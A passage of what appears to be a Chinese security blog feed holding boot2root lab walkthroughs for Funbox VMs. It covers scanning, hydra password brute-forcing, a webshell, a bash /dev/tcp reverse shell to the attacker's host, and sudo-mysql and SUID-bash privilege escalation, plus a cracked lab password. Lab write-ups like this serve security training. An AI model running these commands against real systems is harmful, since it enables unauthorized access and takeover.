    <content><![CDATA[<h1 id="Funbox7"><a href="#Funbox7" class="headerlink" title="Funbox7"></a>Funbox7</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Funbox7</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/etc]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2	20:41:10:1a:04:8c	(Unknown)</span><br><span class="line">192.168.1.3	00:11:32:73:68:3b	Synology Incorporated</span><br><span class="line">192.168.1.109	40:31:3c:22:9c:f3	XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.172	08:00:27:e2:35:04	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line">192.168.1.163	a4:50:46:78:16:9f	Xiaomi Communications Co Ltd</span><br><span class="line"></span><br><span class="line">8 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.071 seconds (123.61 hosts/sec). 8 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.172</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.172</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[~weiyi/vulnhub/funbox7]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.172</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 08:08 EDT</span><br><span class="line">Nmap scan report for funbox7.lan (192.168.1.172)</span><br><span class="line">Host is up (0.00090s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)</span><br><span class="line">|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)</span><br><span class="line">|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:E2:35:04 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Funbox7/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.172/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/tmp]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.172/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.172/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 08:09:23 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10918]</span><br><span class="line">/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.1.172/javascript/]</span><br><span class="line">/mini.php             (Status: 200) [Size: 4443]                                      </span><br><span class="line">/robots.txt           (Status: 200) [Size: 21]                                        </span><br><span class="line">/secret               (Status: 301) [Size: 315] [--&gt; http://192.168.1.172/secret/]    </span><br><span class="line">/phpmyadmin           (Status: 301) [Size: 319] [--&gt; http://192.168.1.172/phpmyadmin/]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                       </span><br><span class="line">                                                                                      </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 08:17:21 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Funbox7/2.png" alt></p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li><a href="http://192.168.1.172/mini.php" target="_blank" rel="noopener">http://192.168.1.172/mini.php</a></li>
</ul>
<p><img data-src="./Funbox7/3.png" alt></p>
<ul>
<li>成功执行</li>
</ul>
<p><img data-src="./Funbox7/4.png" alt></p>
<ul>
<li>上传反弹<code>shell</code></li>
</ul>
<p><img data-src="./Funbox7/5.png" alt></p>
<ul>
<li>发现提示</li>
</ul>
<p><img data-src="./Funbox7/6.png" alt></p>
<p><img data-src="./Funbox7/7.png" alt></p>
<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;user.txt</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">harry</span><br><span class="line">sally</span><br><span class="line">goat</span><br><span class="line">oracle</span><br><span class="line">lissy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hydra -L .&#x2F;user.txt -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 192.168.1.172 ssh</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">goat &#x2F; thebest</span><br></pre></td></tr></table></figure>

<h3 id="登录goat用户-amp-amp-提权"><a href="#登录goat用户-amp-amp-提权" class="headerlink" title="登录goat用户&amp;&amp;提权"></a>登录goat用户&amp;&amp;提权</h3><ul>
<li><code>ssh goat@192.168.1.172</code></li>
</ul>
<p><img data-src="./Funbox7/8.png" alt></p>
<ul>
<li>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mysql -e '\! /bin/sh'</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox7/9.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>FunboxGaoKao</title>
    <url>/2021/07/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/FunboxGaoKao/</url>
    <content><![CDATA[<h1 id="FunboxGaoKao"><a href="#FunboxGaoKao" class="headerlink" title="FunboxGaoKao"></a>FunboxGaoKao</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>FunboxGaoKao</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/Desktop# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:3b:17:d5, IPv4: 192.168.43.92</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    42:bc:b8:53:66:d8       (Unknown: locally administered)</span><br><span class="line">192.168.43.115  08:00:27:82:32:90       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.029 seconds (126.17 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.115</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.115</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/Desktop# nmap -sC -sV -p- 192.168.43.115</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 05:56 EDT</span><br><span class="line">Nmap scan report for 192.168.43.115</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     ProFTPD 1.3.5e</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--   1 ftp      ftp           169 Jun  5 19:45 welcome.msg</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 48:39:31:22:fb:c2:03:44:a7:4e:c0:fa:b8:ad:2f:96 (RSA)</span><br><span class="line">|   256 70:a7:74:5e:a3:79:60:28:1a:45:4c:ab:5c:e7:87:ad (ECDSA)</span><br><span class="line">|_  256 9c:35:ce:f6:59:66:7f:ae:c4:d1:21:16:d5:aa:56:71 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Wellcome to Funbox: Gaokao !</span><br><span class="line">3306/tcp open  mysql   MySQL 5.7.34-0ubuntu0.18.04.1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.7.34-0ubuntu0.18.04.1</span><br><span class="line">|   Thread ID: 3</span><br><span class="line">|   Capabilities flags: 65535</span><br><span class="line">|   Some Capabilities: InteractiveClient, LongPassword, SwitchToSSLAfterHandshake, IgnoreSigpipes, ODBCClient, SupportsCompression, FoundRows, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, LongColumnFlag, Support41Auth, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, ConnectWithDatabase, SupportsTransactions, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: 7GtK;nr?S^SlP5'&lt;A\x07:q</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">| ssl-cert: Subject: commonName=MySQL_Server_5.7.34_Auto_Generated_Server_Certificate</span><br><span class="line">| Not valid before: 2021-06-05T15:15:30                                                                                                                                                                           </span><br><span class="line">|_Not valid after:  2031-06-03T15:15:30                                                                                                                                                                           </span><br><span class="line">|_ssl-date: TLS randomness does not represent time                                                                                                                                                                </span><br><span class="line">MAC Address: 08:00:27:82:32:90 (Oracle VirtualBox virtual NIC)                                                                                                                                                    </span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                    </span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./FunboxGaoKao/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.115/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi# gobuster dir -u http://192.168.43.115/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.115/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/06/19 05:56:44 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10310]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]  </span><br><span class="line">                                                 </span><br><span class="line">===============================================================</span><br><span class="line">2021/06/19 05:59:44 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./FunboxGaoKao/2.png" alt></p>
<ul>
<li><code>FTP</code>服务器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 192.168.1.135</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# ftp 192.168.1.135</span><br><span class="line">Connected to 192.168.1.135.</span><br><span class="line">220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.1.135]</span><br><span class="line">Name (192.168.1.135:weiyi): anonymous</span><br><span class="line">331 Anonymous login ok, send your complete email address as your password</span><br><span class="line">Password:</span><br><span class="line">230-Welcome, archive user anonymous@weiyi.lan !</span><br><span class="line">230-</span><br><span class="line">230-The local time is: Tue Jul 13 00:08:21 2021</span><br><span class="line">230-</span><br><span class="line">230-This is an experimental FTP server.  If you have any unusual problems,</span><br><span class="line">230-please report them via e-mail to &lt;sky@funbox9&gt;.</span><br><span class="line">230-</span><br><span class="line">230 Anonymous access granted, restrictions apply</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure>

<p>发现用户名 <code>sky</code></p>
<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><ul>
<li>暴力破解</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l sky -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.135 ftp</span><br></pre></td></tr></table></figure>

<p><img data-src="./FunboxGaoKao/3.png" alt></p>
<p><img data-src="./FunboxGaoKao/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo "Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd"</span><br></pre></td></tr></table></figure>

<h3 id="上传user-flag获得shell"><a href="#上传user-flag获得shell" class="headerlink" title="上传user.flag获得shell"></a>上传<code>user.flag</code>获得<code>shell</code></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.224&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">put user.flag</span><br><span class="line"></span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> site <span class="built_in">help</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">214-The following SITE commands are recognized (* =&gt;'s unimplemented)</span><br><span class="line">214-CPFR &lt;sp&gt; pathname</span><br><span class="line">214-CPTO &lt;sp&gt; pathname</span><br><span class="line">214-UTIME &lt;sp&gt; YYYYMMDDhhmm[ss] &lt;sp&gt; path</span><br><span class="line">214-SYMLINK &lt;sp&gt; source &lt;sp&gt; destination</span><br><span class="line">214-RMDIR &lt;sp&gt; path</span><br><span class="line">214-MKDIR &lt;sp&gt; path</span><br><span class="line">214-The following SITE extensions are recognized:</span><br><span class="line">214-RATIO -- show all ratios in effect</span><br><span class="line">214-QUOTA</span><br><span class="line">214-HELP</span><br><span class="line">214-CHGRP</span><br><span class="line">214-CHMOD</span><br><span class="line">214 Direct comments to root@funbox9</span><br></pre></td></tr></table></figure>

<p><img data-src="./FunboxGaoKao/5.png" alt></p>
<ul>
<li>获得<code>webshell</code></li>
</ul>
<p><img data-src="./FunboxGaoKao/6.png" alt></p>
<h3 id="提权-amp-amp-FLAG"><a href="#提权-amp-amp-FLAG" class="headerlink" title="提权&amp;&amp;FLAG"></a>提权&amp;&amp;FLAG</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null </span><br><span class="line">&#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;at</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic</span><br></pre></td></tr></table></figure>

<ul>
<li><code>bash</code>提权</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;bash -p</span><br></pre></td></tr></table></figure>

<p><img data-src="./FunboxGaoKao/7.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>FunboxLunchbreaker</title>
    <url>/2021/07/29/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/FunboxLunchbreaker/</url>
    <content><![CDATA[<h1 id="FunboxLunchbreaker"><a href="#FunboxLunchbreaker" class="headerlink" title="FunboxLunchbreaker"></a>FunboxLunchbreaker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>FunboxLunchbreaker</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">──(root💀weiyi)-[/home/weiyi/vulnhub/funbox8]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2	20:41:10:1a:04:8c	(Unknown)</span><br><span class="line">192.168.1.3	00:11:32:73:68:3b	Synology Incorporated</span><br><span class="line">192.168.1.109	40:31:3c:22:9c:f3	XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.172	08:00:27:e2:35:04	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line">192.168.1.222	08:00:27:a1:60:7a	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">8 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.014 seconds (127.11 hosts/sec). 8 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.222</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.222</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox8]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.222</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 08:47 EDT</span><br><span class="line">Nmap scan report for funbox8.lan (192.168.1.222)</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 0        0             633 May 22 12:29 supers3cr3t</span><br><span class="line">|_drwxr-xr-x    6 1006     1006         4096 May 22 12:59 wordpress</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.224</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 1d:3d:bf:5a:e1:9f:bb:31:85:34:94:24:cf:0c:04:20 (RSA)</span><br><span class="line">|   256 3b:e1:5c:97:5a:93:1d:9c:d5:02:e5:d8:15:a7:92:ea (ECDSA)</span><br><span class="line">|_  256 d6:f2:e3:da:7e:d7:3f:94:7e:3b:5d:bc:ef:ee:49:63 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:A1:60:7A (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./FunboxLunchbreaker/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.222/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.222/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php                                                                                      127 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.222/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 08:47:47 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 379]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 46] </span><br><span class="line">/server-status        (Status: 403) [Size: 278]</span><br><span class="line">                                               </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 08:53:18 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./FunboxLunchbreaker/2.png" alt></p>
<ul>
<li>右键查看源代码</li>
</ul>
<p><img data-src="./FunboxLunchbreaker/3.png" alt></p>
<ul>
<li>发现用户<code>jane</code></li>
</ul>
<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l jane -P /usr/share/wordlists/rockyou.txt  192.168.1.222 ssh</span><br></pre></td></tr></table></figure>

